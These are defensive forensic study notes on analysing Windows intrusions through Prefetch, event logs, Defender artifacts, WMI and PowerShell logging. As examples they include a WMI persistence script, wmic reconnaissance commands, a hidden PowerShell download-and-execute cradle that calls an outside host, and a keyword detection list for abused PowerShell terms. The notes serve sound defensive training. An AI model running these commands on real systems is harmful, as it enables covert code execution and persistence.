# Intrusion Analysis

## Advanced Evidence of Execution 

Windows Prefetch 

* Used to improve system performance of Windows endpoints (not servers)  
* **ESSENTIAL** location to observe to get an understanding of what is/has been running on a specific system\!  
* As a forensic analyst, this should be one of the first locations that you look into when performing your analysis\!

### Prefetch

### **TOOL: PECmd.exe**

* [Prefetch Explorer Command Line](https://github.com/EricZimmerman/PECmd?tab=readme-ov-file): Used to parse and output the content within the Windows Prefetch files for easy analysis.

### ShimCache

### **TOOL: AppCompatCacheParser.exe**

* [AppCompatCacheParser.exe](https://github.com/EricZimmerman/AppCompatCacheParser): Microsoft’s Application Compatibility Cache designed to detect and remediate program compatibility challenges with older Windows OS.   
* **ESSENTIALLY**, a database used to determine if a program needs shimming for backwards compatibility.

### Amcache

### **TOOL: Amcacheparaser.exe** 

* [Amcacheparser.exe](https://github.com/EricZimmerman/AmcacheParser): Used to extract each of the Amcache registry keys (e.g., InventoryApplication, InventoryApplicationFile, InventoryDriverBinary, etc.) and output that information into a CSV for easier analysis

### Hunting of ShimCache and Amcache Artifacts

### **TOOL: appcompatprocessor.py**

* [Appcompatprocessor.py](https://github.com/mbevilacqua/appcompatprocessor): Used to parse both ShimCache and Amcache artifacts and place those results into a SQLite database.

* [Tool explained](https://www.youtube.com/watch?v=-0bYcD3_bBs)  
  * Really great video of pivoting utilizing efficient and open source forensics in real time\!

#### **Method of Attack**

* ##### 1\) search

  * Module used to search the endpoint databases for regular expression matches (over 3k “evil” Regex)  
  * Will output a broad list of results \+ high level histogram of all occurrences of those specific results for you to drill down on.

![][image1]

* ##### 2\) tcorr

  * Module used to quantify the temporal correlation strength to find files that regularly execute either before or after each other to identify files and patterns of interest.  
  * **ESSENTIALLY**: provides specific files/artifacts that will inform your IR and give you context on what to pivot to next.

![][image2]

* ##### 3\) leven

  * Module used to identify slight deviations between legitimate and suspicious filenames

![][image3]

* ##### 4\) search \-F

* \`search \-F “*name\_of\_file*”\`  
* From this point you can now pivot from the suspicious file names of “svhost.exe” and “svchosts.exe” and conduct a search for the exact location of that file:

![][image4]

## Event Log Analysis for Responders

**NOTE:** For IR, event logs should be used for targeted investigations (e.g., search for specific event logs that answer specific questions that you have during your investigation)

### Profiling Account Usage

**NOTE I:** while repeated invalid passwords may give you some hint as to a possible password guessing or spraying attack, **invalid usernames** are typically more useful as a user is able to see their username in plain text and the odds of it being typed correctly is typically lower than one's hidden password. 

**NOTE II:** Looking at events surrounding other events of interest is very important to log analysis. THINK of pulling a “timeline thread” and investigating both ends of said thread for items of interest.

### 1\) Account Usage

### **TOOL: Event Log Explorer**

* [Event Log Explorer](https://www.eventlogxp.com/): third-party event log management tool with the ability to quickly parse, sort, correlate, and filter many Windows event logs THINK WireShark for Windows Event Logs\!

* Determining which accounts have been used for attempted logins for legitimate and known compromised accounts.  
  * 4624: Successful Logon  
  * 4625: Failed Logon  
  * 4634/4647: Successful Logoff  
  * 4648: Logon using explicit credentials (RunAs)  
  * 4672: Account logon with superuser rights (Administrator)  
  * 4720/4726: An account was created/deleted

* [Logon Type Codes](https://www.ultimatewindowssecurity.com/securitylog/book/page.aspx?spid=chapter3)

#### 1.1) Identifying Logon Session

* 4624 (Successful logon) followed by 4634/4647 (Successful logoff)  
* Using matching Logon IDs to link logon and logoff to determine session length

![][image5]

#### 1.2) Brute Force/Password Spray Attack

* 4625: Repeated failed login attempts  
* Look for events with repetitive logon attempts seconds apart from one another  
* Failure code of C0000064 \= Unknown User  
* Failure code of C000006A \= Bad password tried on an existing account

![][image6]

#### 1.3) Administrator Account Activity

* Look for EID 4624 (successful logon) followed immediately by EID 4672 (special logon)  
* Combination of those two events **prove** an admin-level logged into a specific system, very useful if you identify that the specific location of the admin login should not have administrative logons\!

#### 1.4) Account Creation

* First indicators are EIDs of 4720/4726: An account was created/deleted  
* Complementary events to look for surrounding this event:  
  * 4722: A user account was enabled  
  * 4724: An attempt was made to reset an an account’s password  
  * 4728: A member was added to a security-enabled global group  
  * 4732: A member was added to a security-enabled local group  
  * 4735: A security-enabled local group was changed  
  * 4738: A user account was changed  
  * 4756: A member was added to the security-enabled universal group

#### 1.5) Remote Desktop Protocol

* Event IDs to help book-end RDP sessions

**NOTE:** They will not provide a historical view of every RDP connection, they are designed to track session “reconnects” instead of brand-new RDP sessions. 

Order of Logs:

* 4779: Session Disconnected  
  * Used to terminate any currently active sessions on that device before establishing a new connection.  
* 4778: Session Reconnected  
* 4624: Successful Logon  
* 4779: Session Disconnected  
* 4647: Successful Logout

#### 1.6) Pass the Hash

* 4776: Account Logon Success/Failure  
* 4624: Successful logon  
  * Logon Type: 3 (indicates network or RDP logon, which can indicate pass the hash attacks, or SMB based actions like mapping shares)

#### 1.7) Account/Group Enumeration

Enabled via Group Policy Advanced Auditing \> Account Management \> “Audit Security Group Management” and “Audit User Account Management”

* Very noisy and **requires filtering on sensitive groups**, unusual accounts, and processes\!  
  * **LOOK FOR**: \`powershell\`, \`wmic\`, \`cmd\` or other “hands-on-keyboard” incidents  
  * **IGNORE**: \`mmc\`, \`taskhostw\`, \`services\`, \`explorer\`

* 4798: A user’s local group membership was enumerated  
* 4799: A security-enabled local group membership was enumerated

### 2\) Tracking Lateral Movement

Identifying activity around network shares. **ESSENTIALLY** knowing what file shares were touched can be helpful to understand data flows

* 5140: Network shared was accessed  
* 5145: Shared object accessed (when turned on, provides detailed file share auditing, BUT is very voluminous and should be deployed tactically as it can be very noisy\!)  
* 5142-5145: track share creation, modification, deletion. 

**An Aside on Network Shares:**

* Lateral movement through network shares like SMB involves an attacker executing code remotely on other endpoints by utilizing the credentials and access obtained from a compromised endpoint. 

**NOTE:** lateral movement falls into two categories

* **Direct Lateral Movement:** RDP/SSH direct command line access to compromised boxes  
  * Direct/Interactive Access the attacker can directly execute commands, navigate the file system, and use applications.

  * More visibility because they involve interactive sessions that can be logged and monitored.

* **Indirect Lateral Movement:** involves executing commands or deploying scripts and malware on remote systems without establishing an interactive session.   
  * This is often done through exploiting vulnerabilities or using administrative tools like SMB, PsExec, or PowerShell.

  * Non-Interactive Execution: The attacker can execute code remotely without directly logging into the system's user interface.

  * Less visibility as the actions can blend in with normal network traffic and administrative activities, making them harder to detect.

**Examples of Indirect Lateral Movement**

* SMB and PsExec: used to execute commands on remote systems by leveraging administrative shares. This allows them to deploy malware or scripts without needing a direct session.

* Fileless Malware: Attackers might execute scripts directly in memory using tools like PowerShell or Windows Management Instrumentation (WMI), which do not leave traditional file-based traces.

* Hidden Directories: Attackers might download payloads from a command and control (C2) server into hidden directories like \`\\temp\\\` or \`\\recyclebin\\\`, where they can be executed without drawing attention.

#### 2.1) Admin Shares

* 4624 \> 5140 \> 5140

![][image7]  
![][image8]

* Mapping of **ADMIN$**: commonly abused network share

![][image9]

* Inter-Process Communication (IPC)  
* Contains additional information that the previous 5140 event did not include. **BE SURE TO LOOK AROUND EVENT TO GAIN MORE INFORMATION\!**

#### 2.2) Explicit Credentials/*runas*

Used to track credential change common during lateral movement as it is necessary when moving from file system to file system. Typically the EIDs associated with this activity are: 

* 4624: Successful logon (Type 9\)  
* 4648: Logon using explicit credentials

**NOTE:** 4648 events are logged on the **source machine** which can assist in indicating where the attacker will be going\!

* Oftentimes you will need more than one log to complete the picture of what exactly occurred during a time period\!

![][image10]

* 4648: event identified \> tdungan (rd01) accessing wacsvc \> wacsvc targeting wkstn01 on **445** via **.7.11**

  ***Now we look for event logs surrounding the time this 4648 event was created along with EIDs associated with SMB (445)...***

* 5140: event identified \> wacsvc mapping the C$ share, matching the previous 4648 event

#### 2.3) Explicit Credentials: Identifying Cobalt Strike (*make\_token*; *pth*)

![][image11]

* 4624 (successful login) \+ Type 9 (runas)   
  * Here we see the user account “spsql” logging into itself **VERY ODD**

**NOTE:** this occurs when a user is already logged into the system that the attacker has compromised. Frameworks like Cobalt Strike generate a token of the user to laterally move from account to account.

* 4648 (explicit credential login)  
  * Here we see the target/destination of “spsql”

#### 2.4) Schedule Tasks

Used to enable persistence and lateral movement techniques by attackers. Scheduled tasks are commonly deleted after execution and can be modified both locally or remotely\!

* **Example**: An attacker gaining initial access to a network, running a local schedule task to dump hashes of all users (mostly likely from a domain admin) across the LAN that they have access to and exfiltrating those hashes back to their C2 server.

Task Scheduler EIDs:

* 106: Schedule Task Created  
* 140: Schedule Task Updated  
* 141: Schedule Task Deleted  
* 200: Schedule Task Executed  
* 201: Schedule Task Completed

Security Log EIDs:

* 4698: Schedule Task Created  
* 4699: Schedule Task Deleted  
* 4701: Schedule Task Disabled  
* 4702: Schedule Task Updated

![][image12]

* **Pairing of TaskScheduler EID: 106 \+ 201**  
  * Required to get the full picture of the event that has taken place

**NOTE:** an attacker can make their scheduled task any inconspicuous name that they want, HOWEVER, the file being run from the **\`C:\\temp\\\`** directory identifies that executable as suspicious\!

![][image13]

##### 2.4.1) TaskScheduler v1.2 Artifacts

**NOTE:** when a task is created, an XML file of that task is written to disk and saved to   
**\`\\Windows\\System32\\Tasks\\\`** AND **\`\\Windows\\SysWOW64\\Tasks\`** (for tasks created using 32-bit code). Use in conjunction with TaskScheduler and Security EIDs to identify malicious activity\!

**![][image14]**

**Identifying Remote or Local Task Scheduling:**

* Looking at the “Author” tag under **\`RegistrationInfo\`** allows us to identify whether the task was created remotely or locally  
  * Remote \= user and hostname that created the task is present  
  * Local \= no system or hostname present

* [Parsing Task Scheduler XML files into CSV format](https://github.com/vikas891/My-Scripts/tree/master/General)

### 3\) Suspicious Services

Used to analyze logs for suspicious services running at boot time. A large amount of malware and worms utilize Services.

**System Log**

* 7034: Service crash unexpectedly  
* 7035: Service sent a Start/Stop control  
* 7036: Service started or stopped  
* 7040: Start type changed (Boot | On Request | Disabled)  
* 7045: A new service was installed on the system

**Security Log**

* 4697: A new service was installed on the system

**NOTE:** most of the EIDs above are very noisy (e.g., 200+ services start and stop every time a machine reboots), **HOWEVER**, EID \`**7045\`** \+ \`**4697\`** log **NEW** service installation which is more rare (EASY WIN)\! Use to correlate the installation of a new service at or around potential attacker activity.

#### 3.1) PsExec

PsExec Explained

* PsExec is a powerful command-line utility from the Sysinternals suite, designed to execute processes on remote systems. Widely used by system administrators and has the ability to manage and troubleshoot remote computers without needing to install client software on the target systems. Allows for remote execution, privilege management, software installation, etc. and is mainly focused on executing processes remotely.

![][image15]

**Analyst Indicators:**   
Filtering for EID 7045 (new service installation)

* User Account S-1-5-21…  
  * Indicates the installation of a new service installed by a domain user account (**VERY ODD)**

* Service Name:  
  * Nonsensical/auto-generated service name (**VERY ODD**)  
  * PsExec generates a new service and 7045 EID each time that it is run.

* Service File Name:   
  * PowerShell invoking executable that is Base64 encoded (**VERY ODD**)

#### 3.2) Per-User Services

![][image16]  
Affects Security EID 4697 (new service installation)

* New services after Windows 10 are named by adding a Locally Unique Identifier (LUID), the new service is logged by Security and generates multiple 4697 EIDs every time the user logs in. 

* To mitigate against this:  
  * Filter in Event Explorer the specific valid executables (e.g., \`C:\\Windows\\system32\\svchost.exe \-k UnistackSvcGroup\`)

  * Focus primarily on System EID 7045

### 4\) Event Log Clearing

Should be highly monitored and alerts for these specific events should be set in place\!

Security Log

* 1102: Audit log cleared

System Log

* 104: Audit log cleared

![][image17]

#### 4.1) Event Log Attacks

* Mimikatz \`event::drop\`

* DanderSpritz: \`evenlogedit\`  
  * Removes entries from the logs by changing event headers to jump over targeted events. 

* \`Invoke-Phant0m\` thread killing  
  * Seeks out processes running the event log service and kills all running threads.

* Mitigations:  
  * Event log forwarding: forwarding logs from something like a Windows Event Collector to a centralized storage for parsing within a SIEM.

  * Logging “heartbeat”: systems that have unusual gaps in their logging (hence the name heartbeat)

  * Log gap analysis: systems that have not forwarded logs over a period of time.

### TOOL: EvtxECmd

* [EvtxECmd](https://ericzimmerman.github.io/#!index.md): Used to **normalize and filter logs en masse** by utilizing crowd-sourcedevent map files for each event log and event type of interest quickly pulling only the most critical and essential parameters of the events logs into the output of your choice (CSV, JSON, XML). **THINK: tcpdump or tshark** for filtering event logs.

![][image18]  
**NOTE I:** The “Property: PayloadData1-6” columns are for the specific sections of the EID parameters that you want to extract (e.g., TargetDomain, LogonType, etc.) up to **6 columns/parameter** choices.

**NOTE II:** pair with [Timeline Explorer](https://ericzimmerman.github.io/#!index.md) to use the essential EIDs parameters extracted using the EvtxECmd tool to now visually organize and nest information so that it is easily understandable.

### Windows Admin Shares: Source System Artifacts

[Windows Admin Shares Explained](https://youtu.be/41MUhlHGZ4E)  
Windows Admin Shares Overview

* Purpose: Admin Shares like \`ADMIN$\`, \`C$\`, and \`IPC$\` are hidden network shares used by system administrators for remote management and maintenance tasks. These shares are accessible only to users with administrative privileges.  
* Usage: Administrators can use these shares to deploy updates, patches, and configuration files across multiple machines efficiently.

Exploitation by Attackers

* [Credential Compromise](https://www.huntress.com/blog/how-hackers-exploit-windows-administrative-shares): If an attacker gains access to Domain Admin credentials, they can exploit these shares to distribute malicious payloads across the network.

* Lateral Movement: Attackers can use tools like PsExec to execute code remotely via these shares, facilitating indirect lateral movement within the network.

* Payload Deployment: Admin Shares allow attackers to stage and execute malware, harvest credentials, and further enumerate the network to identify additional targets and privileges.

## Command Line, PowerShell, and WMI Analysis

### Event IDs: Malware Execution

* System Event Logs  
  * Review Critical, Warning, and Error events  
* Application Event Logs  
  * 1000-1002: log Windows Error Reporting (WER) and Application **crashes/hangs**

**NOTE I:** document crash/hang events AT or around the time of an incident. The crash event log may not be definitive enough to deem something as malicious, but it can be used as a supplementary artifact in conjunction with other IOCs\!

**NOTE II:** for Windows Error Reporting (WER), there is a size limit (31.4 MB) for retrieving the SHA1 of a file resulting from a crash/hangup. This is due to the EDR/Antivirus ignoring large files for efficiency constraints.

### Microsoft Defender Essential Log Types

#### Event IDs

**Microsoft-Windows-WindowsDefender%4Operational.evtx**: primary log for Microsoft Defender alerts.

* 1116: Malware Detected (most information found here)  
* 1117: Malware Action Taken (most information found here)  
* 1118: Malware Action Failed  
* 1119: Malware Action Critical Failure

**ANALYSIS NOTE**: anytime you identify EIDs 1116/1117 within the Windows Defender Logs, **drill down**\!

#### Microsoft Protection (MPLog-\*)

[**MPLog for Forensic Investigations**](https://www.crowdstrike.com/en-us/blog/how-to-use-microsoft-protection-logging-for-forensic-investigations/)

**C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\MPLog-\***

* Provide additional context and should be used to supplement identified threats (e.g., SHA1 file hashes, process execution, files/folders, and the original file name from PE header)

* Keywords to Search within the MP-Log:  
  * SHA1, detection, tainted, SND Query

#### DetectionHistory

**C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Service\\DetectionHistory**

* Used to track information provided to the end user (e.g., what the end user decided to do after they were notified of the alert).

### TOOL: DHParser

* [DHParser](https://www.sans.org/blog/uncovering-windows-defender-real-time-protection-history-with-dhparser/): used to return meaningful, analysis-ready JSON data, but it can also recursively search a directory on your system for DetectionHistory files, processing each one found in the same manner. Getting results takes only a few seconds, and the various data points could be easily linked to other indicators of compromise in your investigations.

#### Quarantine

**C:\\ProgramData\\Microsoft\\Windows\\Defender\\Quaratine**

* Contains the location of files identified as a potential threat in the eyes of Microsoft Defender. It may contain essential files related to the threat. 

### TOOL: Maldump

* [maldump](https://github.com/NUKIB/maldump): extract quarantined files of multiple AVs from a live system or a mounted disk image.

### Process Tracking and Capturing Command Lines

Capturing full commands to identify the processed launched\!

#### Event IDs

* 4688 (Security Log): A new process was created, and it includes an executable path\!  
* 4689 (Security Log): Process exit

**NOTE:** This process **IS NOT** enabled by default and is a cheap and effective way to capture command line execution\! However, it is very noisy and requires forwarding to a central log repository\!

* Look [HERE](https://github.com/chumphrey-cmd/Blue-Team-Working-Memory/blob/main/Hardening-References.md#yamato-security) for automated deployment of enabling security settings within Windows environments\!

### WMI

* Windows Management Instrumentation (WMI): Enterprise information framework designed to allow access to system data at scale and is also very commonly used by many attackers due to its built-in features with minimal logging. Offers extensive **management capabilities**, allowing administrators to query system configurations, manage services, and gather detailed system information.

#### How WMI Works

WMI Event Filter **“IF Statement”**

* Specific **filters**, **requirements**, or **conditions** that must be met in order for the consumer to initiate.

WMI Event Consumers **“THEN Statement”**

* The CommandLine or ActiveScript that is executed one the initial conditions are met

The **Filter** is the *if* statement: *"If this specific event happens..."*  
The **Consumer** is the *then* statement: *"Then execute this action."*

##### WMI CommandLineEventConsumers

* More versatile since it runs single commands or chains of commands.  
* Commonly used for reconnaissance (like running ipconfig, whoami, or net user) or triggering tools already present on the target (like net.exe, powershell.exe, or custom binaries).  
* Simpler than ActiveScript but equally dangerous when combined with the right WMI filter.

```
wmic /namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="MaliciousConsumer" CommandLineTemplate="cmd.exe /c calc.exe"  
```

##### WMI ActiveScriptEventConsumers

* Focused on full script execution.  
* Scripts are typically VBScript or JScript, often stored or embedded directly in the consumer.  
* It’s great for persistence or more complex tasks (e.g., downloading additional payloads, altering system configs).  
* Artifacts like temp directories, startup folders, or unusual scripts in AppData often hint at misuse.

```
$FilterName = "MaliciousFilter"
$ConsumerName = "MaliciousConsumer"
$Script = "Set WshShell = CreateObject('WScript.Shell') : WshShell.Run('cmd.exe /c calc.exe')"

# Define the event filter
$Filter = ([WMIClass]"\\.\root\subscription:__EventFilter").CreateInstance()
$Filter.Name = $FilterName
$Filter.QueryLanguage = "WQL"
$Filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
$Filter.Put()

# Define the ActiveScript consumer
$Consumer = ([WMIClass]"\\.\root\subscription:ActiveScriptEventConsumer").CreateInstance()
$Consumer.Name = $ConsumerName
$Consumer.ScriptingEngine = "VBScript"
$Consumer.ScriptText = $Script
$Consumer.Put()

# Bind the filter to the consumer
$Binding = ([WMIClass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$Binding.Filter = $Filter.__PATH
$Binding.Consumer = $Consumer.__PATH
$Binding.Put()
```

**Filter Creation:**

* The $Filter object is created from the \_\_EventFilter class.  
* $FilterName is used as the filter's name, and a WQL query specifies what events the filter will match.

**Consumer Creation:**

* The $Consumer object is created from the ActiveScriptEventConsumer class.  
* $ConsumerName is used to name the consumer.  
* The $Script variable provides the malicious payload (e.g., running calc.exe).

**Binding:**

* The __FilterToConsumerBinding object binds the filter ($Filter) to the consumer ($Consumer) using their paths.

##### WMI Event Filter and Consumer Bindings

* Combination/mapping of the filter and consumer together.

#### WMI Attacks: Reconnaissance

\`\`\`bash  
wmic process get CSName,Description,ExecutablePath,ProcessId  
wmic useraccount list full  
wmic group list full  
wmic netuse list full  
wmic qfe get Caption,Description,HotFixID,InstalledOn  
wmic startup get Caption,Command,Location,User

#### WMI Attacks: Privilege Escalation

* **\`PowerUp.ps1\`**: PowerShell Empire [tool](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) used to provide quick insights into misconfigurations and leverages WMI to query over 20 common misconfigurations to elevate privileges.

#### WMI Attacks: Lateral Movement

\`\`\`bash  
wmic.exe PROCESS CALL CREATE…

* Designed to allow local and remote code execution, essentially a built-in version of PsExec.

#### Capturing WMI Command Lines

**NOTE:** without WMI Command line, you are entirely unable to determine what the adversary doing, what files ran, names of malicious executables, paths of where those executables were ran, which processes were called, etc.

* Event Logs (EID 4688\)  
* Microsoft Sysmon  
* Commercial EDR tools

#### Auditing WMI Persistence

##### Event IDs

**WMI-Activity/Operation Log:**

* 5861: identifying permanent event consumer creation (**MOST USEFUL**)  
* 5858: includes the hostname when logging WMI query errors **(NOT VERY USEFUL)**  
* 5857-5861: record filter/consumer activity **(NOT VERY USEFUL)**

**Hunting WMI for Event Consumers**

  * \`CommandLine\`

  * \`powershell\`  
  * \`eval\`

### PowerShell Logging

#### Event IDs

* 4103: Module logging and pipeline output  
* 4104: Script block logging  
* 4105/4106: Script Start/Stop (not recommended, too noisy to be useful for threat hunting)  
* 400/800: associated with the standard Windows PowerShell.evtx, now has more interesting logging included with the upgrade to PSv5.

Logging Options

* Microsoft-Windows-PowerShell/Operational : Log regardless of whether PS was executed from a command shell, from the integrated scripting environment (ISE), or via custom PowerShell components. 

* Microsoft-Windows-PowerShell%4Operational.evtx (PSv5)

* Microsoft-Windows-PowerShellCore%4Operational.evtx (PSv6,7) : allows for cross-compatibility with Mac, Linux, and Windows OS.

* Windows PowerShell.evtx : associated with the standard Windows PowerShell.evtx, now has more interesting logging included with the upgrade to PSv5.

* WinRM/Operational : tracks WinRM connections and logging is available on both the source and destination systems.

#### PowerShell Stealth Syntax

**\`Powershell \-w Hidden \-nop \-noni \-exec bypass IEX (New-Object System.Net.WebClient).downloadstring('http://squirreldirectory.com/a')\`**

* **\`-WindowStyle hidden** (-w hidden)\`: Sets the style of the window to hidden (do not show window)  
* **\`-NoProfile** (-Nop)\`: Does not present an interactive prompt to the user  
* **\`-ExecutionPolicy Bypass** (-ExecBypass)\`: Evade any limits on script execution  
* **\`InvokeExpression (IEX)\`**: Execute arbitrary commands (**very dangerous**)  
* **\`(New-Object System.Net.Webclient).DownloadFile()\`**: Download a file or script from a remote network location  
* **\`-EncodedCommand (-E, \-Enc)\`**: Accepts a base-64 encoded version of a script

#### Filtering PowerShell/Operational Log

**Commonly Abused Keywords ([full list](https://github.com/secprentice/PowerShellWatchlist/blob/master/badshell.txt))**

* download  
* IEX  
* rundll32  
* http  
* Start-Process  
* Invoke-Expression  
* Invoke-Command  
* syswow64  
* FromBase64String  
* WebClient  
* bitstransfer  
* Reflection  
* powershell \-version  
* Invoke-WmiMethod  
* Invoke-CimMethod     
* WebRequest

##### Method of Attack

* Filter for PowerShell/Operational Log  
* Filter for EID 4103/4104  
* Begin your search using the “**Commonly Abused Keywords**”.

* Location:

#### Event Log Collection 

* Live System Collection:  
  * Exporting from EventViewer (right-click \> Save log)  
  * \`PSLogList\` (Sysinternals): can dump live logs to a text or .csv file, read and output exported logs in their native .evt/.evtx format.  
  * Triage Collection: F-Response, KAPE, Velociraptor   
  * PowerShell: native access to event logs and can be used to extract individual events.

* Log Forwarding:  
  * [Windows Event Log Forwarding (WEF)](https://learn.microsoft.com/en-us/archive/technet-wiki/33895.windows-event-forwarding-survival-guide): can be set to push or pull logs at regular intervals from workstations to centralized server  
  * Winlogbeat: agent based forwarder to send logs from endpoints to the Elasticsearch database.

#### Get-WinEvent

* Native cmdlet within PowerShell that can be used to collect and filter logs from a single system or hundreds. Very customizable and enables the power user to optimally extract logs based on pre-filter criteria (e.g., Regex, keyword, time, etc.). Useful for trimming down a large amount of logging data at scale to being your initial hunt\!

\`\`\`PowerShell  
Get-WinEvent \-FilterHashtable @{Logname="Security";id=4624} | Where {$Message \-match "***KEYWORD\_HERE***"}  
\`\`\`  
\`\`\`PowerShell  
Get-WinEvent \-FilterHashtable @{Path="C:\\Path-To-Exported\\Security\*.evtx";id=5140} | Where {$Message \-match "\\\\Admin\\$"}  
\`\`\`
